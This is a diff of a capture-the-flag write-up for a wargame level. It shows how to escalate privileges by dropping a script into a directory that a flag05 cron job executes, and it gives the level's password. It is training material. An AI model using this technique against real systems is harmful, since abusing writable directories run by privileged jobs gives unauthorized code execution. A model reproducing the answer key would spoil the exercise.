@@ -1,58 +1,48 @@
 # level05
 
-We got some intel from level00:
+## Vulnerability: Wildcard trickery
+
+level05's password: `ne2searoevaevoem4ov4ar8ap`
+
+we got some intel from level00:
 
 ```shell
 -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
-
 /opt/openarenaserver
-
 /usr/sbin/openarenaserver
-
 /rofs/opt/openarenaserver
-
 /rofs/usr/sbin/openarenaserver
 ```
 
-1. examinate the file
+1. examinate existing files and permissions
 
 ```shell
+ls -la
+ls -la /usr/sbin/openarenaserver
 cat /usr/sbin/openarenaserver
 ```
 
-shows a shell script that runs all scripts in `/opt/openarenaserver`
+shows a shell script that runs all scripts in `/opt/openarenaserver`, and that the process is running as flag05
 
-2. examinate scripts' permissions
-
-```shell
-ls -la /usr/sbin/openarenaserver
-```
-
-shows that this script belongs to flag05, thus executing it with crontab allows us to run commands as flag05
-
-3. create a custom script
+2. create an exploit script
 
 ```shell
 echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh
 ```
 
-4. make it run as flag05 with flag05 script and crontab
+3. make it run as flag05 with flag05 script and crontab
 
 ```shell
 crontab -e
-```
-
-```shell
 * * * * * /opt/openarenaserver/exploit.sh
 ```
 
 to execute exploit every minute
 
-wait for <= 1 minute for crontab to execute
-
-5. pwn the flag
+4. wait crontab's execution (next minute second 0) then pwn the flag
 
 ```shell
+uptime
 cat /opt/openarenaserver/flag
 ```
 
